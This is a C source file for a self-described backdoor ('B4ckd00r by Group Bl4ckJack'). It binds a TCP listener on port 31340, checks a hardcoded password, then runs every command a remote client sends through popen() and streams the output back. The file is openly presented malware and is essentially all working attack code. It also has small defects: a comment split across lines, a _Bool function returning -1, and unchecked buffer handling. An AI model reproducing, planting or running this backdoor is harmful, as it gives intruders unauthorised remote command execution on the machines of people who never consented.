#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define SOCKET_ERROR 0xFFFFFFFF
#define INVALID_SOCKET 0xFFFFFFFF

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAXBUFLEN 1000000
#define PASS "password"

//Function to check if String starts with some prefix
_Bool Starts_With(const char *pre, const char *str)
{
    size_t lenpre = strlen(pre),
           lenstr = strlen(str);
    return lenstr < lenpre ? -1 : strncmp(pre, str, lenpre) == 0;
}

//Function to drop prefix of certain length from the String
void Drop_N(char *str, size_t n)
{
    size_t len = strlen(str);
    if (n > len)
        return;
    memmove(str, str+n, len - n + 1);
}


int main(int argc,char **argv)
{
	int port;//port #
	(argv[1]) ? (port = atoi(argv[1])) : (port = 31340);//if user defined port is provided or else use default
	printf("[+] Using port %i\n",port); //msg to see which port is used
	if(argc < 2) //if user didnt provide port # tell him about such option
	{
		printf("[*] To change, run: %s <port-number>\n", argv[0]);
	}

	int bytes,character;
	char mensagem[2],buffer[1024],*message,*welcome,*termPointer;
	FILE *command;
	struct sockaddr_in server;


	welcome = "\n[+] Connected\n~: "; //Welcome message
	termPointer = "~: "; //terminal symbol for connected client
	int con;

	printf("[+] Starting.\n");

	if((con = socket(AF_INET , SOCK_STREAM , 0 )) == INVALID_SOCKET) //if there are any problems with the connection socket
	{
		perror("[-] Fail to create socket");
		exit(1);
	}

	printf("[+] Socket created\n");//else socket is created succesfully

	bzero(&server, sizeof(server));//place zero-valued bytes in the area pointed to
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(port);
	bzero(&(server.sin_zero), 8);//place zero-valued bytes in the area pointed to

	if(bind(con,(struct sockaddr *)&server , sizeof(server)) == SOCKET_ERROR)//assigns the address specified by addr to the socket
       descriptor sockfd
	{
		perror("[-] Failed to bind");
		exit(1);
	}

	printf("[+] Bind Ok\n");

	listen(con , 1);//listen to the socket

	printf("[*] Listening for the connection...\n");

	while((con = accept(con,0,0))==SOCKET_ERROR); //accept the connection
	printf("\n[+] Connected !!!\n");

	//below send welcome messages to the client
	message = "[*] B4ckd00r by Group Bl4ckJack\n";
	send(con , message , strlen(message) , 0);
	
	char source[MAXBUFLEN + 1];
	FILE *fp = fopen("img", "r");
	if (fp != NULL) {
   	 size_t newLen = fread(source, sizeof(char), MAXBUFLEN, fp);
   	 if ( ferror( fp ) != 0 ) {
        	fputs("Error reading file", stderr);
    	} else {
       	 source[newLen++] = '\0'; /* Just to be safe. */
    	}

   	 fclose(fp);
	}

	send(con , source , strlen(source) , 0);

	//ask for a password
	message = "Enter password: \n";
	send(con , message , strlen(message) , 0);

	memset(buffer,0,1024);

	recv(con,buffer,1024,0);
	buffer[strlen(buffer)-1] = '\0';
	
	//chekc if the password entered is correct
	if(strcmp(PASS,buffer) == 0)
	{
		send(con,welcome,strlen(welcome),0);
	} else 
	{
			close(con);
		exit(1);
	}

	memset(buffer,0,1024);

	//if the password was correct we enter into infinite loop asking for client commands
	while(1)
	{
		bytes = recv(con,buffer,1024,0);
		if(bytes == -1) break;

		buffer[bytes] = '\0';

		if(strlen(buffer) > 0)
		{

			printf("Received: %s", buffer);
			
			if(strcmp(buffer, "off\n") == 0){termPointer = "[+] Terminating...\n";send(con,termPointer,strlen(termPointer),0);termPointer = "[+] Backdoor Terminated\n";send(con,termPointer,strlen(termPointer),0); break;}
			
			if(strcmp(buffer, "help\n") == 0){termPointer = "[+] Available commands:\n";send(con,termPointer,strlen(termPointer),0); 
			termPointer = " (*) cd <dir> - changes the current working directory to <dir> (go back with cd ..)\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) ls - lists the contents of the current working directory\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) cat <file> - returns contents of the file\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) help - prints a list of commands\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) off - terminates the backdoor program\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) who - list user[s] currently logged in\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) termPointer - show current running processes\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) nmap - run nmap with parametes <params>\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = " (*) mkdir - make directories\n";send(con,termPointer,strlen(termPointer),0);
			termPointer = "	(~) Other build into bash commands available (needs to be tested)\n"; send(con,termPointer,strlen(termPointer),0);
			termPointer = "~: ";
			}
			
			if(Starts_With("cd", buffer))
			{
			  if(buffer[strlen (buffer)-1] == '\n') buffer[strlen (buffer)-1] = '\0';
			  chdir(buffer+3);
			}
			else
			{
			command = popen(buffer,"r"); //use popen for everything except help,off and cd comands from client
			while(1)
			{
				character = fgetc(command);
				if(character == EOF) break;
					sprintf(mensagem,"%c",character);
					send(con,mensagem,1,0);
			}

			pclose(command);
			};
		}

		send(con,termPointer,strlen(termPointer),0);
		memset(&buffer,0,1024);
		memset(&mensagem,0,2);
	}
	//user sent off command so we close the connection and close the backdoor program
	printf("[+] Disconnected\n");

		close(con);

	exit(0);
}
